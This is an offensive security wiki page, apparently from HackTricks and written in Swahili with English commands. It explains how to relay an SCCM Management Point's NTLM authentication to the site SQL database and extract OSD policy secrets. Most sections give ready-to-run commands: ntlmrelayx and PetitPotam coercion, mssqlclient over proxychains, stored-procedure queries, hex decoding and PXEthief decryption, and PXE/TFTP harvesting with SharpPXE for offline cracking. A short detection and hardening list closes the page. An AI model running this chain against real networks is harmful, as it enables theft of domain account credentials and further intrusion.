# SCCM Management Point NTLM Relay to SQL – Utoaji wa Siri za OSD Policy

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kufanya authentication kupitia SMB/RPC na **kurelaya** akaunti hiyo ya mashine ya NTLM kwenda kwenye **site database (MSSQL)**, unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Roles hizi zinakuruhusu kuita seti ya stored procedures zinazofichua policy blobs za **Operating System Deployment (OSD)** (credentials za Network Access Account, Task-Sequence variables, n.k.). Blobs hizo zime-encode kwa hex na zime-encrypt, lakini zinaweza ku-decode na ku-decrypt kwa kutumia **PXEthief**, na hivyo kupata secrets zilizo kwenye plaintext.<sup>[[2]](#references)</sup>

Mlolongo wa jumla:
1. Tambua MP na site DB ↦ endpoint ya HTTP isiyohitaji authentication `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Anzisha `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Luforce MP kwa kutumia **PetitPotam**, PrinterBug, DFSCoerce, n.k.
4. Kupitia SOCKS proxy, connect kwa kutumia `mssqlclient.py -windows-auth` kama akaunti ya **<DOMAIN>\\<MP-host>$** iliyorelayiwa.
5. Tekeleza:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (au `MP_GetPolicyBodyAfterAuthorization`)
6. Ondoa BOM ya `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets kama `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, n.k. hupatikana bila kugusa PXE au clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Kuhesabu endpoints za MP zisizohitaji authentication
MP ISAPI extension **GetAuth.dll** hufichua parameters kadhaa ambazo hazihitaji authentication (isipokuwa site ikiwa PKI-only):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Hurejesha public key ya site signing cert pamoja na GUID za vifaa vya *x86* / *x64* vya **All Unknown Computers**. |
| `MPLIST` | Huorodhesha kila Management-Point katika site. |
| `SITESIGNCERT` | Hurejesha Primary-Site signing certificate (hutambua site server bila LDAP). |

Pata GUID zitakazotumika kama **clientID** kwa DB queries zinazofuata:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## Relay akaunti ya mashine ya MP kwenda MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Coercion inapoanzishwa, unapaswa kuona kitu kama hiki:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Tambua OSD policies kupitia stored procedures
Unganisha kupitia SOCKS proxy (port 1080 kwa default):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Badilisha hadi DB ya **CM_<SiteCode>** (tumia site code yenye tarakimu 3, kwa mfano `CM_001`).

### 3.1  Pata GUID za Unknown-Computer (hiari)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Orodhesha sera zilizogawiwa
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Kila safu ina `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Lenga policies:
* **NAAConfig**  – credentials za Network Access Account
* **TS_Sequence** – vigezo vya Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Inaweza kuwa na akaunti za run-as

### 3.3  Retrieve full body
Ikiwa tayari una `PolicyID` & `PolicyVersion`, unaweza kuruka hitaji la clientID ukitumia:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> MUHIMU: Katika SSMS ongeza “Maximum Characters Retrieved” (>65535), la sivyo blob itakatwa.

---

## 4. Decode & decrypt blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Mfano wa secrets zilizopatikana:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL roles & procedures
Baada ya relay, login ina-mapped kwa:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Roles hizi zinaonyesha ruhusa nyingi za EXEC; zile muhimu zinazotumika katika attack hii ni:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Kuorodhesha policies zilizotumika kwa `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Kurejesha policy body kamili. |
| `MP_GetListOfMPsInSiteOSD` | Inarejeshwa na path ya `MPKEYINFORMATIONMEDIA`. |

Unaweza kukagua orodha kamili kwa kutumia:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Uvunaji wa PXE boot media (SharpPXE)
* **PXE reply over UDP/4011**: tuma ombi la PXE boot kwa Distribution Point iliyosanidiwa kwa PXE. Jibu la proxyDHCP hufichua boot paths kama `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) na `SMSBoot\\x64\\pxe\\boot.bcd`, pamoja na encrypted key blob ya hiari.<sup>[[4]](#references)</sup>
* **Retrieve boot artifacts via TFTP**: tumia paths zilizorejeshwa kupakua `variables.dat` kupitia TFTP (bila authentication). Faili ni ndogo (KB chache) na ina encrypted media variables.
* **Decrypt or crack**:
- Ikiwa jibu lina decryption key, ipeleke kwa **SharpPXE** ili decrypt `variables.dat` moja kwa moja.
- Ikiwa hakuna key iliyotolewa (PXE media imelindwa kwa custom password), SharpPXE hutoa **Hashcat-compatible** `$sccm$aes128$...` hash kwa offline cracking. Baada ya kurecover password, decrypt faili.
* **Parse decrypted XML**: plaintext variables zina SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs, na identifiers nyingine). SharpPXE huziparse na kuchapisha **SharpSCCM** command iliyo tayari kuendeshwa, ikiwa na GUID/PFX/site parameters zilizojazwa kwa ajili ya follow-on abuse.
* **Requirements**: inahitajika tu network reachability kwa PXE listener (UDP/4011) na TFTP; local admin privileges hazihitajiki.

---

## 7. Detection & Hardening
1. **Monitor MP logins** – MP computer account yoyote inayo-login kutoka IP ambayo si host yake ≈ relay.<sup>[[1]](#references)</sup>
2. Enable **Extended Protection for Authentication (EPA)** kwenye site database (`PREVENT-14`).
3. Disable NTLM isiyotumika, enforce SMB signing, restrict RPC (
mitigations hizohizo zinazotumika dhidi ya `PetitPotam`/`PrinterBug`).
4. Harden MP ↔ DB communication kwa IPSec / mutual-TLS.
5. **Constrain PXE exposure** – firewall UDP/4011 na TFTP kwenye trusted VLANs, require PXE passwords, na alert kwenye TFTP downloads za `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
